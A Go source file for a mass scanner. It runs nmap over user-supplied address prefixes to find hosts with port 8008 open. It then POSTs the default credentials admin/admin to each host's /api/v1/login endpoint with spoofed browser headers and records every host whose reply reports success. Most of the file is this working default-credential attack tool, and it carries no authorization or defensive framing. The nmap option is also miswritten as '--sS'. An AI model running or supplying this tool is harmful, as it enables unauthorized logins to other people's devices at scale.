// main.go
package main

import (
	"bufio"
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
	"crypto/tls"
)

var (
	prefixFile string
	scanOut    string
	resultOut  string
	timeoutSec int
	helpFlag   bool
)

func usage() {
	fmt.Printf(`Usage: %s -f prefixes_file [-s scan_out] [-r result_out] [-t curl_timeout]
  -f FILE   prefixes file (one prefix per line) or you may pass prefixes as positional args
  -s FILE   scan output file to append IPs (default: ip_list.txt)
  -r FILE   result file to append matched IP:PORT (default: ok.txt)
  -t SEC    http timeout seconds (default: 10)
  -h        show this help

Example:
  %s -f prefixes.txt -s ip_list.txt -r ok.txt -t 8
`, os.Args[0], os.Args[0])
}

func init() {
	flag.StringVar(&prefixFile, "f", "", "prefixes file")
	flag.StringVar(&scanOut, "s", "ip_list.txt", "scan output file to append IPs")
	flag.StringVar(&resultOut, "r", "ok.txt", "result file to append matched IP:PORT")
	flag.IntVar(&timeoutSec, "t", 10, "http timeout seconds")
	flag.BoolVar(&helpFlag, "h", false, "show help")
}

func readPrefixes(file string, args []string) ([]string, error) {
	p := []string{}
	if file != "" {
		f, err := os.Open(file)
		if err != nil {
			return nil, fmt.Errorf("open prefix file: %w", err)
		}
		defer f.Close()
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			p = append(p, line)
		}
		if err := sc.Err(); err != nil {
			return nil, fmt.Errorf("scan prefix file: %w", err)
		}
	}
	// append positional args as prefixes
	for _, a := range args {
		a = strings.TrimSpace(a)
		if a == "" {
			continue
		}
		p = append(p, a)
	}
	return p, nil
}

var ipRegex = regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)

func extractIPsFromNmapOutput(out []byte) []string {
	lines := strings.Split(string(out), "\n")
	var ips []string
	for _, line := range lines {
		// original script grepped "Nmap scan report for" and awk '{print $5}'
		// nmap output examples:
		// "Nmap scan report for 1.2.3.4"
		// "Nmap scan report for hostname (1.2.3.4)"
		if !strings.Contains(line, "Nmap scan report for") {
			continue
		}
		// find IPv4 inside the line
		m := ipRegex.FindString(line)
		if m != "" {
			ips = append(ips, m)
			continue
		}
		// fallback: split and try 5th field like original
		fields := strings.Fields(line)
		if len(fields) >= 5 {
			ips = append(ips, fields[4])
		}
	}
	return ips
}

func appendLinesToFile(path string, lines []string) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	for _, l := range lines {
		if _, err := f.WriteString(l + "\n"); err != nil {
			return err
		}
	}
	return nil
}

func ensureFileExists(path string) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND, 0o644)
	if err != nil {
		return err
	}
	return f.Close()
}

func runNmap(prefix string) ([]string, error) {
	cmd := exec.Command("nmap", "--sS", "-Pn", "-p", "8008", "-n", "--open", prefix)

	// 捕获 stdout + stderr
	out, err := cmd.CombinedOutput()

	if err != nil {
		// 容忍错误（比如 nmap 部分主机超时）
		if ee, ok := err.(*exec.ExitError); ok {
			fmt.Fprintf(os.Stderr, "nmap exited with code %d for %s (continuing)\n", ee.ExitCode(), prefix)
		} else {
			return extractIPsFromNmapOutput(out), fmt.Errorf("nmap error: %w", err)
		}
	}

	return extractIPsFromNmapOutput(out), nil
}


func isIPv4(s string) bool {
	return net.ParseIP(s) != nil
}

func doCheckLine(client *http.Client, timeout time.Duration, line string) (matched bool, host string, respBody []byte, err error) {
	// trim and skip comments should be done by caller, but re-ensure
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return false, "", nil, nil
	}

	raw := line
	ip := raw
	port := ""

	if strings.Contains(raw, ":") {
		// might be IPv6 or host:port; but original script expects IPv:PORT
		// so split at last colon to support hostname:port
		idx := strings.LastIndex(raw, ":")
		ip = raw[:idx]
		port = raw[idx+1:]
	}
	if port == "" {
		port = "8008"
	}
	// if ip field was like "hostname (1.2.3.4)" try extract ip
	if !isIPv4(ip) {
		m := ipRegex.FindString(ip)
		if m != "" {
			ip = m
		}
	}

	host = fmt.Sprintf("%s:%s", ip, port)
	url := fmt.Sprintf("http://%s/api/v1/login", host)
	origin := fmt.Sprintf("http://%s", host)
	referer := fmt.Sprintf("http://%s/dashboard/login", host)

	// prepare request
	body := []byte(`{"username":"admin","password":"admin"}`)
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(body))
	if err != nil {
		return false, host, nil, fmt.Errorf("new request: %w", err)
	}
	// headers
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", origin)
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", referer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")

	// send
	resp, err := client.Do(req)
	if err != nil {
		return false, host, nil, nil // treat as no response (like the original)
	}
	defer resp.Body.Close()
	b, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1<<20)) // limit to 1MB
	if err != nil {
		return false, host, nil, fmt.Errorf("read body: %w", err)
	}
	respBody = b

	// check for "success": true
	re := regexp.MustCompile(`"success"\s*:\s*true\b`)
	if re.Match(respBody) {
		return true, host, respBody, nil
	}
	return false, host, respBody, nil
}

func main() {
	flag.Parse()
	if helpFlag {
		usage()
		return
	}

	// prefixes from file and positional args
	args := flag.Args()
	prefixes, err := readPrefixes(prefixFile, args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read prefixes error: %v\n", err)
		os.Exit(2)
	}
	if len(prefixes) == 0 {
		fmt.Fprintln(os.Stderr, "No prefixes provided.")
		usage()
		os.Exit(2)
	}

	// ensure files exist (append mode)
	if err := ensureFileExists(scanOut); err != nil {
		fmt.Fprintf(os.Stderr, "ensure scan out file: %v\n", err)
		os.Exit(3)
	}
	if err := ensureFileExists(resultOut); err != nil {
		fmt.Fprintf(os.Stderr, "ensure result out file: %v\n", err)
		os.Exit(3)
	}

	// Phase 1: sequential nmap scan per prefix
	for _, prefix := range prefixes {
		fmt.Printf("Scanning %s ...\n", prefix)
		ips, err := runNmap(prefix)
		if err != nil {
			// tolerate error, but print message
			fmt.Fprintf(os.Stderr, "  nmap returned error for %s: %v (writing any stdout results)\n", prefix, err)
		}
		if len(ips) > 0 {
			if err := appendLinesToFile(scanOut, ips); err != nil {
				fmt.Fprintf(os.Stderr, "  append to scan out failed: %v\n", err)
			}
		}
	}
	fmt.Printf("Scanning finished. IPs appended to %s\n", scanOut)

	// Phase 2: read scan output and perform checks
	f, err := os.Open(scanOut)
	if err != nil {
		fmt.Fprintf(os.Stderr, "open scan out: %v\n", err)
		os.Exit(4)
	}
	defer f.Close()
	sc := bufio.NewScanner(f)

	// prepare HTTP client with timeout and insecure TLS (like --insecure)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: transport,
		// we'll use per-request context timeout, but set a global large timeout
		Timeout: time.Duration(timeoutSec+5) * time.Second,
	}
	// open result file for append once
	resFile, err := os.OpenFile(resultOut, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "open result file: %v\n", err)
		os.Exit(5)
	}
	defer resFile.Close()

	for sc.Scan() {
		line := sc.Text()
		// trim
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, "#") {
			continue
		}
		raw := line
		ip := raw
		port := ""
		if strings.Contains(raw, ":") {
			idx := strings.LastIndex(raw, ":")
			ip = raw[:idx]
			port = raw[idx+1:]
		}
		if port == "" {
			port = "8008"
		}
		// rebuild host displayed to user
		host := fmt.Sprintf("%s:%s", ip, port)
		url := fmt.Sprintf("http://%s/api/v1/login", host)
		fmt.Printf("Requesting %s ...\n", url)

		matched, h, _, err := doCheckLine(client, time.Duration(timeoutSec)*time.Second, line)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  request error: %v\n", err)
			continue
		}
		if matched {
			// append host to result file
			if _, err := resFile.WriteString(h + "\n"); err != nil {
				fmt.Fprintf(os.Stderr, "  write result error: %v\n", err)
			} else {
				fmt.Printf("  => matched, appended %s to %s\n", h, resultOut)
			}
		} else {
			fmt.Printf("  => not matched\n")
		}
	}
	if err := sc.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "scan file read error: %v\n", err)
	}
	fmt.Printf("All done. Scanned IPs in %s ; matched in %s\n", scanOut, resultOut)
}
